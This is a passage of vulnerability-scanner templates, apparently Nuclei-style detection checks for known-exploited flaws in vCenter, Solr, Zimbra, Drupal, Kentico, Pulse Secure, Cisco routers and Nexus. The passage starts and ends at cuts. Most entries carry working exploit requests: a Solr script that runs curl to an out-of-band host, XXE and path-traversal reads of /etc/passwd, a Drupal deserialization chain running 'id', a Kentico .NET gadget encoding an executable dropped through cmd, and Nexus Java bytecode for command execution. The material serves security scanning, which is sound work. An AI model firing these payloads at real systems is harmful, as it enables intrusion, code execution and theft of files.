- The vSphere Client (HTML5) contains a remote code execution vulnerability due to lack of input validation in the Virtual SAN Health Check plug-in which is enabled by default in vCenter Server. A malicious actor with network access to port 443 may exploit this issue to execute commands with unrestricted privileges on the underlying operating system that hosts vCenter Server.

- severity - critical
- tags - cve,cve2021,rce,vsphere,vmware,kev

## Requests

### Step - 1

```
POST /ui/h5-vsan/rest/proxy/service/com.vmware.vsan.client.services.capability.VsanCapabilityProvider/getClusterCapabilityData HTTP/1.1
Host: {{Hostname}}
Accept: */*
Content-Type: application/json

{"methodInput":[{"type":"ClusterComputeResource","value": null,"serverGuid": null}]}

```

### Matchers

**Type - word**

- words
  1. {"result":{"isDisconnected":
- part - body

---

# VMware vCenter Unauthenticated SSRF

## Description

- The vSphere Client (HTML5) contains an SSRF (Server Side Request Forgery) vulnerability due to improper validation of URLs in a vCenter Server plugin. A malicious actor with network access to port 443 may exploit this issue by sending a POST request to vCenter Server plugin leading to information disclosure. This affects VMware vCenter Server (7.x before 7.0 U1c, 6.7 before 6.7 U3l and 6.5 before 6.5 U3n) and VMware Cloud Foundation (4.x before 4.2 and 3.x before 3.10.1.2).
- severity - medium
- tags - cve,cve2021,vmware,ssrf,vcenter,oast,kev

## Requests

### Step - 1

```
GET /ui/vropspluginui/rest/services/getvcdetails HTTP/1.1
Host: {{Hostname}}
Vcip: {{interactsh-url}}
Vcpassword: {{rand_base(6)}}
Vcusername: {{rand_base(6)}}
Reqresource: {{rand_base(6)}}

```

### Matchers

**Type - status**

- status
  1. 500

**Type - word**

- part - body
- words
  1. The server sent HTTP status code 200

---

# Apache Solr DataImportHandler \<8.2.0 - Remote Code Execution

## Description

- Apache Solr is vulnerable to remote code execution vulnerabilities via the DataImportHandler, an optional but popular module to pull in data from databases and other sources. The module has a feature in which the whole DIH configuration can come from a request's "dataConfig" parameter. The debug mode of the DIH admin screen uses this to allow convenient debugging / development of a DIH config. Since a DIH config can contain scripts, this parameter is a security risk.

- severity - high
- tags - cve2019,apache,rce,solr,oast,kev,vulhub,cve

## Requests

### Step - 1

```
GET /solr/admin/cores?wt=json HTTP/1.1
Host: {{Hostname}}
Accept-Language: en
Connection: close

```

### Step - 2

```
POST /solr/{{core}}/dataimport?indent=on&wt=json HTTP/1.1
Host: {{Hostname}}
Content-type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest

command=full-import&verbose=false&clean=false&commit=true&debug=true&core=test&dataConfig=%3CdataConfig%3E%0A++%3CdataSource+type%3D%22URLDataSource%22%2F%3E%0A++%3Cscript%3E%3C!%5BCDATA%5B%0A++++++++++function+poc()%7B+java.lang.Runtime.getRuntime().exec(%22curl%20{{interactsh-url}}%22)%3B%0A++++++++++%7D%0A++%5D%5D%3E%3C%2Fscript%3E%0A++%3Cdocument%3E%0A++++%3Centity+name%3D%22stackoverflow%22%0A++++++++++++url%3D%22https%3A%2F%2Fstackoverflow.com%2Ffeeds%2Ftag%2Fsolr%22%0A++++++++++++processor%3D%22XPathEntityProcessor%22%0A++++++++++++forEach%3D%22%2Ffeed%22%0A++++++++++++transformer%3D%22script%3Apoc%22+%2F%3E%0A++%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E&name=dataimport

```

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. http

**Type - status**

- status
  1. 200

### Extractors

**Type - regex**

- internal - True
- name - core
- group - 1
- regex
  1. "name"\:"(.\*?)"

---

# Synacor Zimbra Collaboration \<8.7.11p10 - XML External Entity Injection

## Description

- Synacor Zimbra Collaboration Suite 8.7.x before 8.7.11p10 has an XML external entity injection (XXE) vulnerability via the mailboxd component.
- severity - critical
- tags - cve,cve2019,zimbra,xxe,kev,edb,packetstorm

## Requests

### Step - 1

```
POST /Autodiscover/Autodiscover.xml HTTP/1.1
Host: {{Hostname}}
Content-Type: application/xml

<!DOCTYPE xxe [
<!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a">
<Request>
<EMailAddress>aaaaa</EMailAddress>
<AcceptableResponseSchema>&xxe;</AcceptableResponseSchema>
</Request>
</Autodiscover>

```

### Matchers

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0:
  2. Problem accessing
- condition - and

**Type - status**

- status
  1. 503

---

# Drupal - Remote Code Execution

## Description

- Drupal 8.5.x before 8.5.11 and Drupal 8.6.x before 8.6.10 V contain certain field types that do not properly sanitize data from non-form sources, which can lead to arbitrary PHP code execution in some cases.
- severity - high
- tags - cve,cve2019,drupal,rce,kev,cisa

## Requests

- Method - POST
- Method - POST

### URL

- {{BaseURL}}/node/1?\_format=hal_json
  - { "link": [ { "value": "link", "options": "O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{s:33:\"\u0000GuzzleHttp\\Psr7\\FnStream\u0000methods\";a:1:{s:5:\"close\";a:2:{i:0;O:23:\"GuzzleHttp\\HandlerStack\":3:{s:32:\"\u0000GuzzleHttp\\HandlerStack\u0000handler\";s:2:\"id\";s:30:\"\u0000GuzzleHttp\\HandlerStack\u0000stack\";a:1:{i:0;a:1:{i:0;s:6:\"system\";}}s:31:\"\u0000GuzzleHttp\\HandlerStack\u0000cached\";b:0;}i:1;s:7:\"resolve\";}}s:9:\"_fn_close\";a:2:{i:0;r:4;i:1;s:7:\"resolve\";}}" } ], "\_links": { "type": { "href": "http://192.168.1.25/drupal-8.6.9/rest/type/shortcut/default" } } }

### Matchers

**Type - word**

- words
  1. uid=
  2. gid=
  3. groups=
- condition - and
- part - body

**Type - status**

- status
  1. 200

---

# WordPress Social Warfare \<3.5.3 - Cross-Site Scripting

## Description

- WordPress Social Warfare plugin before 3.5.3 contains a cross-site scripting vulnerability via the wp-admin/admin-post.php?swp_debug=load_options swp_url parameter, affecting Social Warfare and Social Warfare Pro.
- severity - medium
- tags - cve,cve2019,wordpress,wp-plugin,ssrf,kev

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://{{interactsh-url}}

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- part - interactsh_protocol
- words
  1. http

---

# Kentico CMS Insecure Deserialization Remote Code Execution

## Description

- Kentico CMS is susceptible to remote code execution via a .NET deserialization vulnerability.
- severity - critical
- tags - cve2019,kentico,iis,packetstorm,cve,rce,deserialization,kev,msf

## Requests

- Method - POST
- Method - POST

### URL

- {{BaseURL}}/CMSPages/Staging/SyncServer.asmx/ProcessSynchronizationTaskData
  - stagingTaskData=%3cSOAP-ENV%3aEnvelope%20xmlns%3axsi%3d%22http%3a//www.w3.org/2001/XMLSchema-instance%22%20xmlns%3axsd%3d%22http%3a//www.w3.org/2001/XMLSchema%22%20xmlns%3aSOAP-ENC%3d%22http%3a//schemas.xmlsoap.org/soap/encoding/%22%20xmlns%3aSOAP-ENV%3d%22http%3a//schemas.xmlsoap.org/soap/envelope/%22%20xmlns%3aclr%3d%22http%3a//schemas.microsoft.com/soap/encoding/clr/1.0%22%20SOAP-ENV%3aencodingStyle%3d%22http%3a//schemas.xmlsoap.org/soap/encoding/%22%3e%0a%20%20%3cSOAP-ENV%3aBody%3e%0a%20%20%20%20%3ca1%3aWindowsIdentity%20id%3d%22ref-1%22%20xmlns%3aa1%3d%22http%3a//schemas.microsoft.com/clr/nsassem/System.Security.Principal/mscorlib%2c%20Version%3d4.0.0.0%2c%20Culture%3dneutral%2c%20PublicKeyToken%3db77a5c561934e089%22%3e%0a%20%20%20%20%20%20%3cSystem.Security.ClaimsIdentity.actor%20id%3d%22ref-2%22%20xmlns%3d%22%22%20xsi%3atype%3d%22xsd%3astring%22%3eAAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAALoXL2MgZWNobyBUVnFRQUFNQUFBQUVBQUFBLy84QUFMZ0FBQUFBQUFBQVFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQTZBQUFBQTRmdWc0QXRBbk5JYmdCVE0waFZHaHBjeUJ3Y205bmNtRnRJR05oYm01dmRDQmlaU0J5ZFc0Z2FXNGdSRTlUSUcxdlpHVXVEUTBLSkFBQUFBQUFBQUNUT1BEVzExbWVoZGRabm9YWFdaNkZyRVdTaGROWm5vVlVSWkNGM2xtZWhiaEdsSVhjV1o2RnVFYWFoZFJabm9YWFdaK0ZIbG1laFZSUnc0WGZXWjZGZzNxdWhmOVpub1VRWDVpRjFsbWVoVkpwWTJqWFdaNkZBQUFBQUFBQUFBQUFBQUFBQUFBQUFGQkZBQUJNQVFRQU81UnRTZ0FBQUFBQUFBQUE0QUFQQVFzQkJnQUFzQUFBQUtBQUFBQUFBQUNiaFFBQUFCQUFBQURBQUFBQUFFQUFBQkFBQUFBUUFBQUVBQUFBQUFBQUFBUUFBQUFBQUFBQUFHQUJBQUFRQUFBQUFBQUFBZ0FBQUFBQUVBQUFFQUFBQUFBUUFBQVFBQUFBQUFBQUVBQUFBQUFBQUFBQUFBQUFiTWNBQUhnQUFBQUFVQUVBeUFjQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQU9EQkFBQWNBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBREFBQURnQVFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBTG5SbGVIUUFBQUJtcVFBQUFCQUFBQUN3QUFBQUVBQUFBQUFBQUFBQUFBQUFBQUFBSUFBQVlDNXlaR0YwWVFBQTVnOEFBQURBQUFBQUVBQUFBTUFBQUFBQUFBQUFBQUFBQUFBQUFFQUFBRUF1WkdGMFlRQUFBRnh3QUFBQTBBQUFBRUFBQUFEUUFBQUFBQUFBQUFBQUFBQUFBQUJBQUFEQUxuSnpjbU1BQUFESUJ3QUFBRkFCQUFBUUFBQUFFQUVBQUFBQUFBQUFBQUFBQUFBQVFBQUFRQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUE%2bPiVURU1QJVxock9YVy5iNjQGBwAAAANjbWQEBQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQdtZXRob2QwB21ldGhvZDEDAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5L1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyCQgAAAAJCQAAAAkKAAAABAgAAAAwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BwAAAAR0eXBlCGFzc2VtYmx5BnRhcmdldBJ0YXJnZXRUeXBlQXNzZW1ibHkOdGFyZ2V0VHlwZU5hbWUKbWV0aG9kTmFtZQ1kZWxlZ2F0ZUVudHJ5AQECAQEBAzBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkGCwAAALACU3lzdGVtLkZ1bmNgM1tbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MsIFN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQYMAAAAS21zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQoGDQAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5Bg4AAAAaU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MGDwAAAAVTdGFydAkQAAAABAkAAAAvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIHAAAABE5hbWUMQXNzZW1ibHlOYW1lCUNsYXNzTmFtZQlTaWduYXR1cmUKU2lnbmF0dXJlMgpNZW1iZXJUeXBlEEdlbmVyaWNBcmd1bWVudHMBAQEBAQADCA1TeXN0ZW0uVHlwZVtdCQ8AAAAJDQAAAAkOAAAABhQAAAA%2bU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MgU3RhcnQoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykGFQAAAD5TeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyBTdGFydChTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQgAAAAKAQoAAAAJAAAABhYAAAAHQ29tcGFyZQkMAAAABhgAAAANU3lzdGVtLlN0cmluZwYZAAAAK0ludDMyIENvbXBhcmUoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykGGgAAADJTeXN0ZW0uSW50MzIgQ29tcGFyZShTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQgAAAAKARAAAAAIAAAABhsAAABxU3lzdGVtLkNvbXBhcmlzb25gMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0JDAAAAAoJDAAAAAkYAAAACRYAAAAKCw%3d%3d%3c/System.Security.ClaimsIdentity.actor%3e%0a%20%20%20%20%3c/a1%3aWindowsIdentity%3e%0a%20%20%3c/SOAP-ENV%3aBody%3e%0a%3c/SOAP-ENV%3aEnvelope%3e

### Matchers

**Type - status**

- status
  1. 500

**Type - word**

- words
  1. System.InvalidCastException
  2. System.Web.Services.Protocols.SoapException
- part - body
- condition - and

---

# Pulse Connect Secure SSL VPN Arbitrary File Read

## Description

- Pulse Secure Pulse Connect Secure (PCS) 8.2 before 8.2R12.1, 8.3 before 8.3R7.1, and 9.0 before 9.0R3.4 all contain an arbitrary file reading vulnerability that could allow unauthenticated remote attackers to send a specially crafted URI to gain improper access.
- severity - critical
- tags - cve,cve2019,pulsesecure,lfi,kev

## Requests

- Method - GET

### URL

- {{BaseURL}}/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/

### Matchers

**Type - status**

- status
  1. 200

**Type - regex**

- regex
  1. root:.\*:0:0:
- part - body

---

# Cisco Small Business WAN VPN Routers - Sensitive Information Disclosure

## Description

- Cisco Small Business RV320 and RV325 Dual Gigabit WAN VPN Routers could allow an unauthenticated remote attacker to retrieve sensitive information due to improper access controls for URLs. An attacker could exploit this vulnerability by connecting to an affected device via HTTP or HTTPS and requesting specific URLs. A successful exploit could allow the attacker to download the router configuration or detailed diagnostic information.

- severity - high
- tags - kev,edb,cve,cve2019,cisco,router,exposure

## Requests

- Method - GET

### URL

- {{BaseURL}}/cgi-bin/config.exp

### Matchers

**Type - word**

- part - body
- words
  1. sysconfig

**Type - status**

- status
  1. 200

---

# Sonatype Nexus Repository Manager \<3.15.0 - Remote Code Execution

## Description

- Sonatype Nexus Repository Manager before 3.15.0 is susceptible to remote code execution.
- severity - critical
- tags - cve,cve2019,nexus,rce,kev

## Requests

### Step - 1

```
POST /service/extdirect HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json
X-Requested-With: XMLHttpRequest

{"action": "coreui_Component", "type": "rpc", "tid": 8, "data": [{"sort": [{"direction": "ASC", "property": "name"}], "start": 0, "filter": [{"property": "repositoryName", "value": "*"}, {"property": "expression", "value": "function(x, y, z, c, integer, defineClass){   c=1.class.forName('java.lang.Character');   integer=1.class;   x='cafebabe0000003100ae0a001f00560a005700580a005700590a005a005b0a005a005c0a005d005e0a005d005f0700600a000800610a006200630700640800650a001d00660800410a001d00670a006800690a0068006a08006b08004508006c08006d0a006e006f0a006e00700a001f00710a001d00720800730a000800740800750700760a001d00770700780a0079007a08007b08007c07007d0a0023007e0a0023007f0700800100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c65010004746869730100114c4578706c6f69742f546573743233343b01000474657374010015284c6a6176612f6c616e672f537472696e673b29560100036f626a0100124c6a6176612f6c616e672f4f626a6563743b0100016901000149010003636d640100124c6a6176612f6c616e672f537472696e673b01000770726f636573730100134c6a6176612f6c616e672f50726f636573733b01000269730100154c6a6176612f696f2f496e70757453747265616d3b010006726573756c740100025b42010009726573756c745374720100067468726561640100124c6a6176612f6c616e672f5468726561643b0100056669656c640100194c6a6176612f6c616e672f7265666c6563742f4669656c643b01000c7468726561644c6f63616c7301000e7468726561644c6f63616c4d61700100114c6a6176612f6c616e672f436c6173733b01000a7461626c654669656c640100057461626c65010005656e74727901000a76616c75654669656c6401000e68747470436f6e6e656374696f6e01000e48747470436f6e6e656374696f6e0100076368616e6e656c01000b487474704368616e6e656c010008726573706f6e7365010008526573706f6e73650100067772697465720100154c6a6176612f696f2f5072696e745772697465723b0100164c6f63616c5661726961626c65547970655461626c650100144c6a6176612f6c616e672f436c6173733c2a3e3b01000a457863657074696f6e7307008101000a536f7572636546696c6501000c546573743233342e6a6176610c002700280700820c008300840c008500860700870c008800890c008a008b07008c0c008d00890c008e008f0100106a6176612f6c616e672f537472696e670c002700900700910c009200930100116a6176612f6c616e672f496e74656765720100106a6176612e6c616e672e5468726561640c009400950c009600970700980c0099009a0c009b009c0100246a6176612e6c616e672e5468726561644c6f63616c245468726561644c6f63616c4d617001002a6a6176612e6c616e672e5468726561644c6f63616c245468726561644c6f63616c4d617024456e74727901000576616c756507009d0c009e009f0c009b00a00c00a100a20c00a300a40100276f72672e65636c697073652e6a657474792e7365727665722e48747470436f6e6e656374696f6e0c00a500a601000e676574487474704368616e6e656c01000f6a6176612f6c616e672f436c6173730c00a700a80100106a6176612f6c616e672f4f626a6563740700a90c00aa00ab01000b676574526573706f6e73650100096765745772697465720100136a6176612f696f2f5072696e745772697465720c00ac002f0c00ad002801000f4578706c6f69742f546573743233340100136a6176612f6c616e672f457863657074696f6e0100116a6176612f6c616e672f52756e74696d6501000a67657452756e74696d6501001528294c6a6176612f6c616e672f52756e74696d653b01000465786563010027284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573733b0100116a6176612f6c616e672f50726f6365737301000777616974466f7201000328294901000e676574496e70757453747265616d01001728294c6a6176612f696f2f496e70757453747265616d3b0100136a6176612f696f2f496e70757453747265616d010009617661696c61626c6501000472656164010007285b4249492949010005285b4229560100106a6176612f6c616e672f54687265616401000d63757272656e7454687265616401001428294c6a6176612f6c616e672f5468726561643b010007666f724e616d65010025284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f436c6173733b0100106765744465636c617265644669656c6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f7265666c6563742f4669656c643b0100176a6176612f6c616e672f7265666c6563742f4669656c6401000d73657441636365737369626c65010004285a2956010003676574010026284c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0100176a6176612f6c616e672f7265666c6563742f41727261790100096765744c656e677468010015284c6a6176612f6c616e672f4f626a6563743b2949010027284c6a6176612f6c616e672f4f626a6563743b49294c6a6176612f6c616e672f4f626a6563743b010008676574436c61737301001328294c6a6176612f6c616e672f436c6173733b0100076765744e616d6501001428294c6a6176612f6c616e672f537472696e673b010006657175616c73010015284c6a6176612f6c616e672f4f626a6563743b295a0100096765744d6574686f64010040284c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f436c6173733b294c6a6176612f6c616e672f7265666c6563742f4d6574686f643b0100186a6176612f6c616e672f7265666c6563742f4d6574686f64010006696e766f6b65010039284c6a6176612f6c616e672f4f626a6563743b5b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0100057772697465010005636c6f736500210026001f000000000002000100270028000100290000002f00010001000000052ab70001b100000002002a00000006000100000009002b0000000c000100000005002c002d00000009002e002f0002002900000304000400140000013eb800022ab600034c2bb60004572bb600054d2cb60006bc084e2c2d032cb60006b6000757bb0008592db700093a04b8000a3a05120b57120cb8000d120eb6000f3a06190604b6001019061905b600113a07120b571212b8000d3a0819081213b6000f3a09190904b6001019091907b600113a0a120b571214b8000d3a0b190b1215b6000f3a0c190c04b60010013a0d03360e150e190ab80016a2003e190a150eb800173a0f190fc70006a70027190c190fb600113a0d190dc70006a70016190db60018b60019121ab6001b990006a70009840e01a7ffbe190db600183a0e190e121c03bd001db6001e190d03bd001fb600203a0f190fb600183a101910122103bd001db6001e190f03bd001fb600203a111911b600183a121912122203bd001db6001e191103bd001fb60020c000233a1319131904b600241913b60025b100000003002a0000009600250000001600080017000d0018001200190019001a0024001b002e001d0033001f004200200048002100510023005b002500640026006a002700730029007d002a0086002b008c002d008f002f009c003100a5003200aa003300ad003500b6003600bb003700be003900ce003a00d1002f00d7003d00de003e00f4003f00fb004001110041011800420131004401380045013d0049002b000000de001600a5002c00300031000f0092004500320033000e0000013e003400350000000801360036003700010012012c00380039000200190125003a003b0003002e0110003c003500040033010b003d003e0005004200fc003f00400006005100ed004100310007005b00e3004200430008006400da004400400009007300cb00450031000a007d00c100460043000b008600b800470040000c008f00af00480031000d00de006000490043000e00f4004a004a0031000f00fb0043004b004300100111002d004c0031001101180026004d004300120131000d004e004f00130050000000340005005b00e3004200510008007d00c100460051000b00de006000490051000e00fb0043004b0051001001180026004d005100120052000000040001005300010054000000020055';   y=0;   z='';   while (y lt x.length()){       z += c.toChars(integer.parseInt(x.substring(y, y+2), 16))[0];       y += 2;   